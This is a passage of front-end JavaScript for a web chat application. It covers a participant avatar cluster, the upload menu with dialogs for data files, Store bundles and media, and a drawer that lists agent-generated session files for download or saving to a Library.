  // Participant avatar cluster — one initial per participant.
  const cluster = document.createElement("div");
  cluster.className = "participant-avatars";
  cluster.style.cssText = "display:inline-flex;gap:4px;margin-left:6px;";
  for (const p of participants) {
    const a = document.createElement("span");
    a.className = "participant-avatar";
    a.title = p.email || "";
    a.textContent = (p.email || "?").charAt(0).toUpperCase();
    a.style.cssText = (
      "display:inline-flex;align-items:center;justify-content:center;" +
      "width:24px;height:24px;border-radius:50%;" +
      "background:var(--ds-surface-accent,var(--ds-border));" +
      "color:var(--ds-text-primary);font-size:var(--ds-text-xs,0.75rem);" +
      "border:1px solid var(--ds-border);"
    );
    cluster.appendChild(a);
  }
  host.appendChild(cluster);

  // Invite (owner) or Fork (collaborator) action button.
  const isOwner = participants.some(
    (p) => p.email === currentUserEmail && p.role === "owner",
  );
  const btn = document.createElement("button");
  btn.className = "co-presence-action";
  btn.style.cssText = (
    "margin-left:6px;padding:2px 8px;border-radius:var(--ds-radius-sm,4px);" +
    "border:1px solid var(--ds-border);background:var(--ds-surface);" +
    "color:var(--ds-text-primary);cursor:pointer;font-size:var(--ds-text-xs,0.75rem);"
  );
  if (isOwner) {
    btn.textContent = "Invite";
    btn.dataset.action = "invite";
  } else {
    btn.textContent = "Fork";
    btn.dataset.action = "fork";
  }
  host.appendChild(btn);
}

// ---------------------------------------------------------------------------
// §6 "+" upload menu and file-upload dialogs
// ---------------------------------------------------------------------------
// Three upload paths:
//   data   → POST /api/chat/uploads  kind=data   (+ optional register_as_table)
//   store  → POST /api/store/entities             (mirrors store_upload.html)
//   media  → POST /api/chat/uploads  kind=image|document
//
// Menu is a popover anchored inside the composer form (position: relative).
// Dialogs are full-screen overlays (position: fixed, z-index: 50).

(function () {
  // ── helpers ──────────────────────────────────────────────────────────────

  function escHtml(s) {
    return String(s).replace(/[&<>"']/g, (c) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])
    );
  }

  function fmtSize(n) {
    if (n < 1024) return n + " B";
    if (n < 1048576) return (n / 1024).toFixed(1) + " KB";
    return (n / 1048576).toFixed(1) + " MB";
  }

  // ── "+" button + menu ─────────────────────────────────────────────────────

  const plusBtn  = $("chat-plus-btn");
  const plusMenu = $("chat-plus-menu");

  function closePlusMenu() {
    if (!plusMenu || !plusBtn) return;
    plusMenu.hidden = true;
    plusBtn.classList.remove("is-open");
    plusBtn.setAttribute("aria-expanded", "false");
  }

  function openPlusMenu() {
    if (!plusMenu || !plusBtn) return;
    plusMenu.hidden = false;
    plusBtn.classList.add("is-open");
    plusBtn.setAttribute("aria-expanded", "true");
    // Focus first item for keyboard users.
    const first = plusMenu.querySelector("[role=menuitem]");
    if (first) first.focus();
  }

  if (plusBtn) {
    plusBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      if (plusMenu && !plusMenu.hidden) { closePlusMenu(); return; }
      openPlusMenu();
    });
  }

  // Close on Esc or outside click.
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && plusMenu && !plusMenu.hidden) {
      closePlusMenu();
      if (plusBtn) plusBtn.focus();
    }
  });
  document.addEventListener("click", (e) => {
    if (!plusMenu || plusMenu.hidden) return;
    if (plusMenu.contains(e.target) || e.target === plusBtn) return;
    closePlusMenu();
  });

  // Keyboard nav inside the menu (arrow keys).
  if (plusMenu) {
    plusMenu.addEventListener("keydown", (e) => {
      const items = Array.from(plusMenu.querySelectorAll("[role=menuitem]"));
      const idx   = items.indexOf(document.activeElement);
      if (e.key === "ArrowDown") {
        e.preventDefault();
        if (idx < items.length - 1) items[idx + 1].focus();
      } else if (e.key === "ArrowUp") {
        e.preventDefault();
        if (idx > 0) items[idx - 1].focus();
      } else if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        if (items[idx]) items[idx].click();
      } else if (e.key === "Escape") {
        closePlusMenu();
        if (plusBtn) plusBtn.focus();
      }
    });
  }

  // ── generic dialog helpers ────────────────────────────────────────────────

  // Per-overlay Esc-handler cleanup, so closing via Cancel / backdrop / a
  // successful upload also detaches the document listener — not just Escape
  // (otherwise handlers accumulate across repeated opens).
  const _overlayCleanups = {};

  // Open an upload overlay.  Returns a cleanup fn.
  function openOverlay(overlayId) {
    const overlay = $(overlayId);
    if (!overlay) return;
    closePlusMenu();
    overlay.hidden = false;
    // Focus the first focusable element in the panel.
    const first = overlay.querySelector(
      'button, [href], input, [tabindex]:not([tabindex="-1"])'
    );
    if (first) first.focus();

    // Esc closes. Replace any stale handler for this overlay first.
    if (_overlayCleanups[overlayId]) _overlayCleanups[overlayId]();
    function onKey(e) {
      if (e.key === "Escape") closeOverlay(overlayId);
    }
    document.addEventListener("keydown", onKey);
    _overlayCleanups[overlayId] = function cleanup() {
      document.removeEventListener("keydown", onKey);
      delete _overlayCleanups[overlayId];
    };
    return _overlayCleanups[overlayId];
  }

  function closeOverlay(overlayId) {
    const overlay = $(overlayId);
    if (overlay) overlay.hidden = true;
    // Detach the Esc handler however the overlay was closed.
    if (_overlayCleanups[overlayId]) _overlayCleanups[overlayId]();
  }

  // Wire all [data-close-upload] buttons inside a given overlay.
  function wireCloseButtons(overlayId) {
    const overlay = $(overlayId);
    if (!overlay) return;
    overlay.querySelectorAll("[data-close-upload]").forEach((btn) => {
      btn.addEventListener("click", () => closeOverlay(overlayId));
    });
    // Click on backdrop (the overlay itself, not the panel) also closes.
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) closeOverlay(overlayId);
    });
  }

  // Generic drop-zone wiring.
  function wireDropZone(dropEl, fileInput, onFile) {
    if (!dropEl || !fileInput) return;

    // Click anywhere on the zone → open picker.
    dropEl.addEventListener("click", (e) => {
      if (e.target.tagName !== "BUTTON") fileInput.click();
    });
    dropEl.addEventListener("keydown", (e) => {
      if (e.key === "Enter" || e.key === " ") { e.preventDefault(); fileInput.click(); }
    });

    fileInput.addEventListener("change", () => {
      if (fileInput.files && fileInput.files[0]) onFile(fileInput.files[0]);
    });

    dropEl.addEventListener("dragenter", (e) => { e.preventDefault(); dropEl.classList.add("is-dragover"); });
    dropEl.addEventListener("dragover",  (e) => { e.preventDefault(); e.stopPropagation(); dropEl.classList.add("is-dragover"); });
    dropEl.addEventListener("dragleave", (e) => {
      if (dropEl.contains(e.relatedTarget)) return;
      dropEl.classList.remove("is-dragover");
    });
    dropEl.addEventListener("drop", (e) => {
      e.preventDefault();
      dropEl.classList.remove("is-dragover");
      const f = e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0];
      if (f) onFile(f);
    });
  }

  function showDropFile(dropEl, filenameEl, file) {
    dropEl.classList.add("has-file");
    if (filenameEl) {
      // textContent is already XSS-safe; escHtml would double-escape and show
      // literal entities (e.g. "a&amp;b.csv"). Assign the raw name.
      filenameEl.textContent = file.name + " (" + fmtSize(file.size) + ")";
      filenameEl.hidden = false;
    }
  }

  function clearDropFile(dropEl, filenameEl) {
    dropEl.classList.remove("has-file");
    if (filenameEl) { filenameEl.textContent = ""; filenameEl.hidden = true; }
  }

  function showDialogError(errorEl, msg) {
    if (!errorEl) return;
    errorEl.textContent = msg;
    errorEl.hidden = false;
  }

  function clearDialogError(errorEl) {
    if (!errorEl) return;
    errorEl.textContent = "";
    errorEl.hidden = true;
  }

  function setSubmitBusy(btn, busy, label) {
    if (!btn) return;
    btn.disabled = busy;
    if (busy) {
      btn.innerHTML = '<span class="cloud-chat-upload-spinner" aria-hidden="true"></span>' + escHtml(label || "Uploading…");
    } else {
      btn.textContent = label || "Upload";
    }
  }

  // ── Dialog 1: Data file ───────────────────────────────────────────────────

  const DATA_OVERLAY = "chat-upload-data-overlay";
  wireCloseButtons(DATA_OVERLAY);

  const dataDropEl      = $("chat-data-drop");
  const dataFileInput   = $("chat-data-file");
  const dataFilenameEl  = $("chat-data-drop-filename");
  const dataRegisterCb  = $("chat-data-register");
  const dataTableNameRow = $("chat-data-table-name-row");
  const dataTableNameIn = $("chat-data-table-name");
  const dataErrorEl     = $("chat-data-error");
  const dataSubmitBtn   = $("chat-data-submit");

  let _dataFile = null;

  // Show/hide table-name field when checkbox changes.
  if (dataRegisterCb) {
    dataRegisterCb.addEventListener("change", () => {
      if (dataTableNameRow) dataTableNameRow.hidden = !dataRegisterCb.checked;
    });
  }

  function resetDataDialog() {
    _dataFile = null;
    if (dataDropEl) clearDropFile(dataDropEl, dataFilenameEl);
    if (dataFileInput) dataFileInput.value = "";
    if (dataRegisterCb) dataRegisterCb.checked = false;
    if (dataTableNameRow) dataTableNameRow.hidden = true;
    if (dataTableNameIn) dataTableNameIn.value = "";
    if (dataErrorEl) clearDialogError(dataErrorEl);
    if (dataSubmitBtn) { dataSubmitBtn.disabled = true; dataSubmitBtn.textContent = "Upload"; }
  }

  wireDropZone(dataDropEl, dataFileInput, (file) => {
    const MAX = 20 * 1024 * 1024;
    if (file.size > MAX) {
      showDialogError(dataErrorEl, "File is too large — max 20 MB per upload.");
      return;
    }
    clearDialogError(dataErrorEl);
    _dataFile = file;
    showDropFile(dataDropEl, dataFilenameEl, file);
    if (dataSubmitBtn) dataSubmitBtn.disabled = false;
    // Auto-fill table name from filename stem.
    if (dataTableNameIn) {
      const stem = file.name.replace(/\.[^.]+$/, "").replace(/[^A-Za-z0-9_]/g, "_").replace(/_+/g, "_").replace(/^_|_$/g, "") || "upload";
      dataTableNameIn.value = stem;
    }
  });

  if (dataSubmitBtn) {
    dataSubmitBtn.addEventListener("click", async () => {
      if (!_dataFile) return;
      clearDialogError(dataErrorEl);
      setSubmitBusy(dataSubmitBtn, true, "Uploading…");

      try {
        const fd = new FormData();
        fd.append("file", _dataFile);
        fd.append("kind", "data");
        if (dataRegisterCb && dataRegisterCb.checked) {
          fd.append("register_as_table", "true");
          const tname = (dataTableNameIn && dataTableNameIn.value.trim()) || "";
          if (tname) fd.append("table_name", tname);
        }

        const res = await fetch("/api/chat/uploads", {
          method: "POST", body: fd, credentials: "same-origin",
        });

        if (res.ok) {
          const data = await res.json();
          closeOverlay(DATA_OVERLAY);
          resetDataDialog();
          showToast(data.hint || "File uploaded to your workspace.", "ok", { durationMs: 5000 });
        } else {
          let msg = "Upload failed.";
          if (res.status === 413) {
            msg = "File too large — max 20 MB per chat upload.";
          } else if (res.status === 415) {
            msg = "File type not allowed for data uploads. Use CSV, Parquet, or Excel.";
          } else {
            try {
              const j = await res.json();
              msg = (j && j.detail) ? String(j.detail) : msg;
            } catch (_) {}
          }
          showDialogError(dataErrorEl, msg);
        }
      } catch (err) {
        showDialogError(dataErrorEl, "Upload failed: " + String(err));
      } finally {
        setSubmitBusy(dataSubmitBtn, false, "Upload");
      }
    });
  }

  // ── Dialog 2: Store submission ────────────────────────────────────────────

  const STORE_OVERLAY = "chat-upload-store-overlay";
  wireCloseButtons(STORE_OVERLAY);

  const storeDropEl     = $("chat-store-drop");
  const storeFileInput  = $("chat-store-file");
  const storeFilenameEl = $("chat-store-drop-filename");
  const storeErrorEl    = $("chat-store-error");
  const storeSubmitBtn  = $("chat-store-submit");
  const storeTiles      = $("chat-store-type-tiles");
  const storeStackCb    = $("chat-store-stack");
  const storeShareCb    = $("chat-store-share");

  let _storeFile = null;

  // The primary action names the destination the checkboxes actually chose:
  // sharing is the only one that leaves the uploader's account, so it takes
  // the label. Everything else is a Library save.
  function storeSubmitLabel() {
    return (storeShareCb && storeShareCb.checked) ? "Submit to Store" : "Save to Library";
  }

  if (storeShareCb) {
    storeShareCb.addEventListener("change", () => {
      if (storeSubmitBtn && !storeSubmitBtn.disabled) {
        storeSubmitBtn.textContent = storeSubmitLabel();
      }
    });
  }

  // Store type-tile interaction (radio + visual active class).
  if (storeTiles) {
    storeTiles.querySelectorAll("label").forEach((lbl) => {
      lbl.addEventListener("click", () => {
        storeTiles.querySelectorAll("label").forEach((l) => l.classList.remove("is-active"));
        lbl.classList.add("is-active");
      });
    });
  }

  function resetStoreDialog() {
    _storeFile = null;
    if (storeDropEl) clearDropFile(storeDropEl, storeFilenameEl);
    if (storeFileInput) storeFileInput.value = "";
    if (storeErrorEl) clearDialogError(storeErrorEl);
    // Destination defaults: Library + Stack on, sharing off (Private is the
    // default for anything uploaded through chat).
    if (storeStackCb) storeStackCb.checked = true;
    if (storeShareCb) storeShareCb.checked = false;
    if (storeSubmitBtn) { storeSubmitBtn.disabled = true; storeSubmitBtn.textContent = storeSubmitLabel(); }
    // Reset type to skill.
    if (storeTiles) {
      storeTiles.querySelectorAll("label").forEach((l) => l.classList.remove("is-active"));
      const first = storeTiles.querySelector("label");
      if (first) first.classList.add("is-active");
      const radio = storeTiles.querySelector('input[value="skill"]');
      if (radio) radio.checked = true;
    }
  }

  wireDropZone(storeDropEl, storeFileInput, (file) => {
    const MAX = 50 * 1024 * 1024;
    if (file.size > MAX) {
      showDialogError(storeErrorEl, "File too large — max 50 MB for store submissions.");
      return;
    }
    if (!/\.(zip|skill)$/i.test(file.name)) {
      showDialogError(storeErrorEl, "Only .zip or .skill files are accepted for store submissions.");
      return;
    }
    clearDialogError(storeErrorEl);
    _storeFile = file;
    showDropFile(storeDropEl, storeFilenameEl, file);
    if (storeSubmitBtn) {
      storeSubmitBtn.disabled = false;
      storeSubmitBtn.textContent = storeSubmitLabel();
    }
  });

  if (storeSubmitBtn) {
    storeSubmitBtn.addEventListener("click", async () => {
      if (!_storeFile) return;
      clearDialogError(storeErrorEl);
      const share = !!(storeShareCb && storeShareCb.checked);
      const wantStack = !!(storeStackCb && storeStackCb.checked);
      setSubmitBusy(storeSubmitBtn, true, share ? "Submitting…" : "Saving…");

      try {
        // Step 1: run /preview to extract frontmatter (name, description).
        const type = storeTiles
          ? (storeTiles.querySelector('input[name="chat-store-type"]:checked') || {}).value || "skill"
          : "skill";

        const previewFd = new FormData();
        previewFd.append("file", _storeFile);
        previewFd.append("type", type);
        const previewRes = await fetch("/api/store/entities/preview", {
          method: "POST", body: previewFd, credentials: "same-origin",
        });

        let name = "", description = "", title = "";
        if (previewRes.ok) {
          const preview = await previewRes.json();
          name        = preview.name        || "";
          description = preview.description || "";
          title       = preview.title       || name;
        } else {
          // Validation failed (e.g. wrong type or malformed zip) — surface error.
          let msg = "Bundle validation failed.";
          try {
            const j = await previewRes.json();
            if (j && j.detail) {
              msg = typeof j.detail === "object"
                ? (j.detail.code || "validation_failed")
                : String(j.detail);
            }
          } catch (_) {}
          showDialogError(storeErrorEl, msg + " Check the bundle layout and try again.");
          return;
        }

        // Step 2: create the entity. Mirror the shape from store_upload.html.
        const fd = new FormData();
        fd.append("file", _storeFile);
        fd.append("type", type);
        fd.append("name", name);
        fd.append("description", description);
        fd.append("title", title || name);
        // The "Share with everyone" checkbox IS the access choice: unchecked
        // keeps the entity private to its author's Library, checked submits it
        // to the Store for review. Same field the /skills builder writes.
        fd.append("access", share ? "everyone" : "private");
        // No photo, docs, category, video_url in the quick-submit path — the user
        // can edit those on the item's page in the Library afterwards.

        const res = await fetch("/api/store/entities", {
          method: "POST", body: fd, credentials: "same-origin",
        });

        if (res.ok) {
          const entity = await res.json();

          // Step 3: the Stack checkbox. A private entity is installable by its
          // own author; a shared one is still under review, so the install is
          // refused with 409 until it is approved — say so instead of
          // pretending it landed.
          let stackOk = false, stackPending = false;
          if (wantStack) {
            try {
              const ir = await fetch(
                "/api/store/entities/" + encodeURIComponent(entity.id) + "/install",
                { method: "POST", credentials: "same-origin" },
              );
              stackOk = ir.ok;
              stackPending = ir.status === 409;
            } catch (_) { /* network — reported as "not added" below */ }
          }

          closeOverlay(STORE_OVERLAY);
          resetStoreDialog();

          let msg = share
            ? "Submitted to the Store for review. It's in your Library now."
            : "Saved to your Library, private to you.";
          if (wantStack && stackOk) {
            msg += " Added to your stack.";
          } else if (wantStack && stackPending) {
            msg += " Add it to your stack once the review approves it.";
          } else if (wantStack) {
            msg += " Could not add it to your stack — do it from the Library.";
          }
          showToast(msg, "ok", { durationMs: 6000 });
          setTimeout(() => {
            window.open("/library?new=" + encodeURIComponent(entity.id), "_blank", "noopener");
          }, 600);
        } else {
          let msg = share ? "Submission failed." : "Save failed.";
          if (res.status === 409) {
            msg = "A Store entity with this name already exists under your account.";
          } else {
            try {
              const j = await res.json();
              const d = j && j.detail;
              if (d && typeof d === "object") {
                msg = d.code === "validation_failed"
                  ? "Bundle did not pass review. Fix the issues and upload again."
                  : d.code === "security_blocked"
                  ? "Upload blocked: security review found risky patterns."
                  : d.code || msg;
              } else if (d) {
                msg = String(d);
              }
            } catch (_) {}
          }
          showDialogError(storeErrorEl, msg);
        }
      } catch (err) {
        showDialogError(storeErrorEl, "Upload failed: " + String(err));
      } finally {
        setSubmitBusy(storeSubmitBtn, false, storeSubmitLabel());
      }
    });
  }

  // ── Dialog 3: Image / Document ────────────────────────────────────────────

  const MEDIA_OVERLAY = "chat-upload-media-overlay";
  wireCloseButtons(MEDIA_OVERLAY);

  const mediaDropEl     = $("chat-media-drop");
  const mediaFileInput  = $("chat-media-file");
  const mediaFilenameEl = $("chat-media-drop-filename");
  const mediaErrorEl    = $("chat-media-error");
  const mediaSubmitBtn  = $("chat-media-submit");

  let _mediaFile = null;

  // Derive kind from mime / extension.
  function _mediaKind(file) {
    const ct = (file.type || "").toLowerCase();
    if (ct.startsWith("image/")) return "image";
    if (ct === "application/pdf") return "document";
    const ext = (file.name || "").toLowerCase().match(/\.[^.]+$/);
    if (ext && [".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"].includes(ext[0])) return "image";
    return "document";  // txt, md, pdf → document
  }

  function resetMediaDialog() {
    _mediaFile = null;
    if (mediaDropEl) clearDropFile(mediaDropEl, mediaFilenameEl);
    if (mediaFileInput) mediaFileInput.value = "";
    if (mediaErrorEl) clearDialogError(mediaErrorEl);
    if (mediaSubmitBtn) { mediaSubmitBtn.disabled = true; mediaSubmitBtn.textContent = "Upload"; }
  }

  wireDropZone(mediaDropEl, mediaFileInput, (file) => {
    const MAX = 20 * 1024 * 1024;
    if (file.size > MAX) {
      showDialogError(mediaErrorEl, "File too large — max 20 MB per chat upload.");
      return;
    }
    clearDialogError(mediaErrorEl);
    _mediaFile = file;
    showDropFile(mediaDropEl, mediaFilenameEl, file);
    if (mediaSubmitBtn) mediaSubmitBtn.disabled = false;
  });

  if (mediaSubmitBtn) {
    mediaSubmitBtn.addEventListener("click", async () => {
      if (!_mediaFile) return;
      clearDialogError(mediaErrorEl);
      setSubmitBusy(mediaSubmitBtn, true, "Uploading…");

      try {
        const kind = _mediaKind(_mediaFile);
        const fd = new FormData();
        fd.append("file", _mediaFile);
        fd.append("kind", kind);

        const res = await fetch("/api/chat/uploads", {
          method: "POST", body: fd, credentials: "same-origin",
        });

        if (res.ok) {
          const data = await res.json();
          closeOverlay(MEDIA_OVERLAY);
          resetMediaDialog();
          showToast(data.hint || "File uploaded to your workspace.", "ok", { durationMs: 5000 });
        } else {
          let msg = "Upload failed.";
          if (res.status === 413) {
            msg = "File too large — max 20 MB per chat upload.";
          } else if (res.status === 415) {
            msg = "File type not allowed. Accepted: images (PNG, JPEG, WebP, SVG, GIF), PDF, plain text, Markdown.";
          } else {
            try {
              const j = await res.json();
              msg = (j && j.detail) ? String(j.detail) : msg;
            } catch (_) {}
          }
          showDialogError(mediaErrorEl, msg);
        }
      } catch (err) {
        showDialogError(mediaErrorEl, "Upload failed: " + String(err));
      } finally {
        setSubmitBusy(mediaSubmitBtn, false, "Upload");
      }
    });
  }

  // ── Wire menu items → dialogs ─────────────────────────────────────────────

  if (plusMenu) {
    plusMenu.querySelectorAll("[data-upload-action]").forEach((item) => {
      const action = item.dataset.uploadAction;
      const handler = () => {
        closePlusMenu();
        if (action === "data") {
          resetDataDialog();
          openOverlay(DATA_OVERLAY);
        } else if (action === "store") {
          resetStoreDialog();
          openOverlay(STORE_OVERLAY);
        } else if (action === "media") {
          resetMediaDialog();
          openOverlay(MEDIA_OVERLAY);
        }
      };
      item.addEventListener("click", handler);
      item.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") { e.preventDefault(); handler(); }
      });
    });
  }

  // ── Session files (#1611) ─────────────────────────────────────────────────
  // The way OUT for files the agent generated in the session workspace: the
  // header "Files" button opens an overlay listing the session's files
  // (GET .../files), each row with a download link (GET .../files/download —
  // served attachment+nosniff) and a save-to-Library action
  // (POST .../files/save-artefact). Rows are built with createElement +
  // textContent — file names/paths are agent-chosen strings, never innerHTML.

  const filesListEl = $("chat-files-list");
  const filesStatusEl = $("chat-files-status");
  const filesErrorEl = $("chat-files-error");

  function fmtWhen(iso) {
    try { return new Date(iso).toLocaleString(); } catch (_) { return ""; }
  }

  function setFilesStatus(msg) {
    if (!filesStatusEl) return;
    filesStatusEl.textContent = msg || "";
    filesStatusEl.hidden = !msg;
  }

  function renderFileRow(chatId, f) {
    const li = document.createElement("li");
    li.className = "cloud-chat-files-row";

    // Extension tile — a scannable anchor per row (textContent only; the
    // name is agent-chosen).
    const icon = document.createElement("span");
    icon.className = "cloud-chat-files-icon";
    icon.setAttribute("aria-hidden", "true");
    const dot = f.name.lastIndexOf(".");
    const ext = dot > 0 ? f.name.slice(dot + 1).slice(0, 4) : "";
    icon.textContent = ext || "file";

    const meta = document.createElement("div");
    meta.className = "cloud-chat-files-meta";
    const name = document.createElement("span");
    name.className = "cloud-chat-files-name";
    name.textContent = f.name;
    name.setAttribute("data-tip", f.name);
    const hint = document.createElement("span");
    hint.className = "cloud-chat-files-hint";
    // Engine listings carry no mtime (modified_at is null) — skip the segment
    // rather than render the epoch.
    hint.textContent =
      f.path + " · " + fmtSize(f.size_bytes) + (f.modified_at ? " · " + fmtWhen(f.modified_at) : "");
    meta.appendChild(name);
    meta.appendChild(hint);

    const actions = document.createElement("div");
    actions.className = "cloud-chat-files-actions";

    // Static SVG markup only — never interpolate file names into it.
    const ICON_DOWNLOAD =
      '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" ' +
      'stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
      '<path d="M8 2v8.5"/><path d="M4.5 7.5 8 11l3.5-3.5"/><path d="M2.5 13.5h11"/></svg>';
    const ICON_SAVE =
      '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" ' +
      'stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
      '<path d="M12.5 14V6.5L9.5 3.5H3.5v10.5z"/><path d="M5.5 3.5V7h5"/><path d="M5.5 14v-4h5v4"/></svg>';
    const ICON_IN_LIBRARY =
      '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" ' +
      'stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
      '<path d="M3 8.5 6.5 12 13 4.5"/></svg>';

    const dl = document.createElement("a");
    dl.className = "cloud-chat-files-btn";
    dl.innerHTML = ICON_DOWNLOAD;
    dl.setAttribute("data-tip", "Download a copy");
    dl.setAttribute("aria-label", "Download " + f.name);
    dl.href =
      "/api/chat/sessions/" + encodeURIComponent(chatId) +
      "/files/download?path=" + encodeURIComponent(f.path);
    dl.setAttribute("download", f.name);

    const save = document.createElement("button");
    save.type = "button";
    save.className = "cloud-chat-files-btn";
    save.innerHTML = ICON_SAVE;
    save.setAttribute("data-tip", "Save to Library — it outlives this session");
    save.setAttribute("aria-label", "Save " + f.name + " to Library");
    save.addEventListener("click", async () => {
      save.disabled = true;
      clearDialogError(filesErrorEl);
      try {
        const res = await fetch(
          "/api/chat/sessions/" + encodeURIComponent(chatId) + "/files/save-artefact",
          {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ path: f.path }),
          }
        );
        if (res.ok) {
          const data = await res.json();
          const link = document.createElement("a");
          link.className = "cloud-chat-files-btn";
          link.innerHTML = ICON_IN_LIBRARY;
          link.setAttribute("data-tip", "Open in your Library");
          link.setAttribute("aria-label", "Saved to Library — open");
          link.href = data.library_url || "/library";
          link.target = "_blank";
          link.rel = "noopener";
          save.replaceWith(link);
          // Record the outcome IN THE ROW, not only in a toast that expires
          // and an icon that explains itself only on hover. This is the
          // "co se stalo a kam" half of TCRD-212: a reader returning to the
          // drawer a minute later can still see which files they kept.
          const saved = document.createElement("span");
          saved.className = "cloud-chat-files-saved";
          saved.textContent = "Saved to Library";
          meta.appendChild(saved);
          li.classList.add("is-saved");
          showToast("Saved to your Library", "ok");
        } else {
          let msg = "Could not save to Library.";
          try {
            const j = await res.json();
            if (j && j.detail) msg = String(j.detail);
          } catch (_) {}
          showDialogError(filesErrorEl, msg);
          save.disabled = false;
        }
      } catch (err) {
        showDialogError(filesErrorEl, "Could not save to Library: " + String(err));
        save.disabled = false;
      }
    });

    actions.appendChild(dl);
    actions.appendChild(save);
    li.appendChild(icon);
    li.appendChild(meta);
    li.appendChild(actions);
    return li;
  }

  /** Fetch the listing. Returns the file array (empty on failure — callers
   *  that run unattended, like the turn-end check, must not surface an error
   *  banner for a background poll). */
  async function fetchSessionFiles(chatId, { quiet = false } = {}) {
    try {
      const res = await fetch(
        "/api/chat/sessions/" + encodeURIComponent(chatId) + "/files",
        { credentials: "same-origin" }
      );
      if (!res.ok) throw new Error("HTTP " + res.status);
      const data = await res.json();
      // `supported: false` is an engine-backed session (kai-agent) whose
      // engine exposes no files channel for this chat. Carried through as a
      // flag rather than rendered here: this function is also the unattended
      // turn-end poll, which must not paint into the drawer.
      return {
        files: data.files || [],
        truncated: !!data.truncated,
        supported: data.supported !== false,
        ok: true,
      };
    } catch (err) {
      if (!quiet) showDialogError(filesErrorEl, "Could not load session files: " + String(err));
      return { files: [], truncated: false, supported: true, ok: false };
    }
  }

  function renderFileList(chatId, files, truncated, supported = true) {
    if (!filesListEl) return;
    filesListEl.replaceChildren();
    if (!supported) {
      // Engine-backed session whose engine has no files channel — an honest
      // notice, not an empty list that reads as "your agent produced nothing".
      setFilesStatus(
        "Files for this conversation live in the engine's sandbox, and the engine connected " +
          "to this instance doesn't expose them yet. Ask the assistant to include the content " +
          "in its reply, or ask your operator about an engine upgrade."
      );
      return;
    }
    if (!files.length) {
      setFilesStatus(
        "No files here yet — when the assistant generates a document in this conversation, it shows up in this list."
      );
      return;
    }
    setFilesStatus(truncated ? "Showing the most recent files only." : "");
    files.forEach((f) => filesListEl.appendChild(renderFileRow(chatId, f)));
  }

  function updateFilesBadge(count) {
    const badge = $("chat-files-count");
    if (!badge) return;
    badge.textContent = String(count);
    badge.hidden = count === 0;
  }

  async function loadSessionFiles() {
    if (!filesListEl) return;
    const chatId = currentChatId;
    if (!chatId) return;
    clearDialogError(filesErrorEl);
    setFilesStatus("Loading…");
    filesListEl.replaceChildren();
    const seq = ++_filesSeq;
    const { files, truncated, supported, ok } = await fetchSessionFiles(chatId);
    // Third writer of the auto-open baseline, and it must claim the sequence
    // like the other two: an open-time seed still in flight would otherwise
    // land on top of what the user is looking at right now. The guard comes
    // BEFORE the render, not just before the baseline write — painting rows
    // for a conversation the user has since left puts that conversation's
    // download links under their cursor.
    if (seq !== _filesSeq || currentChatId !== chatId) return;
    if (!ok) {
      // A failed listing knows nothing, so it must not be written into the
      // baseline: `files` is `[]` on failure, and adopting that would make
      // the next turn re-report every pre-existing deliverable as fresh and
      // pop the drawer over the reader. fetchSessionFiles has already
      // surfaced the error banner (this path is not quiet); just retire the
      // "Loading…" line and leave what we knew before intact.
      setFilesStatus("");
      return;
    }
    renderFileList(chatId, files, truncated, supported);
    updateFilesBadge(files.length);
    _filesSessionId = chatId;
    _knownOutputs = new Set(files.filter(isDeliverable).map((f) => f.path));
    _baselineKnown = true;
  }

  // ── drawer open/close ─────────────────────────────────────────────────────

  const drawer = $("chat-files-drawer");

  function drawerOpen() {
    return drawer && !drawer.hidden;
  }

  function openFilesDrawer() {
    if (!drawer) return;
    drawer.hidden = false;
    document.body.classList.add("chat-files-open");
    if (filesBtn) filesBtn.setAttribute("aria-expanded", "true");
    loadSessionFiles();
  }

  function closeFilesDrawer() {
    if (!drawer) return;
    drawer.hidden = true;
    document.body.classList.remove("chat-files-open");
    if (filesBtn) filesBtn.setAttribute("aria-expanded", "false");
  }

  const filesBtn = $("chat-session-files");
  if (filesBtn) {
    filesBtn.addEventListener("click", () => {
      if (!currentChatId) {
        showToast("Open a conversation first", "error");
        return;
      }
      if (drawerOpen()) { closeFilesDrawer(); return; }
      openFilesDrawer();
    });
  }
  const filesCloseBtn = $("chat-files-close");
  if (filesCloseBtn) filesCloseBtn.addEventListener("click", closeFilesDrawer);
  const filesRefreshBtn = $("chat-files-refresh");
  if (filesRefreshBtn) filesRefreshBtn.addEventListener("click", loadSessionFiles);
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && drawerOpen()) {
      closeFilesDrawer();
      if (filesBtn) filesBtn.focus();
    }
  });

  // ── open by itself when a turn lands a deliverable ────────────────────────
  // Only for files under `outputs/` — the directory the workspace prompt
  // reserves for things meant FOR the user. An agent touches plenty of other
  // files mid-task (scratch, a script it wrote to run once); popping a panel
  // for those would interrupt the read for something nobody asked to see.
  // Anything else only moves the count on the button.

  const OUTPUTS_PREFIX = "outputs/";
  let _knownOutputs = new Set();
  // Two different questions, and conflating them was a bug: `_filesSessionId`
  // is which conversation the drawer is BOUND to (claimed synchronously, so
  // the badge/row reset can happen before the listing round-trip), while
  // `_baselineKnown` is whether `_knownOutputs` actually reflects it. A seed
  // that failed or was superseded leaves the drawer bound but ignorant — and
  // an ignorant baseline reports every pre-existing file as fresh.
  let _filesSessionId = null;
  let _baselineKnown = false;
  // Bumped by every baseline write. Two fetches for the same conversation can
  // be in flight at once (the open-time seed and a turn-end poll), and they
  // can land out of order; without this, a slow seed overwrites the newer
  // turn-end baseline and the next turn re-reports files as fresh.
  let _filesSeq = 0;

  function isDeliverable(f) {
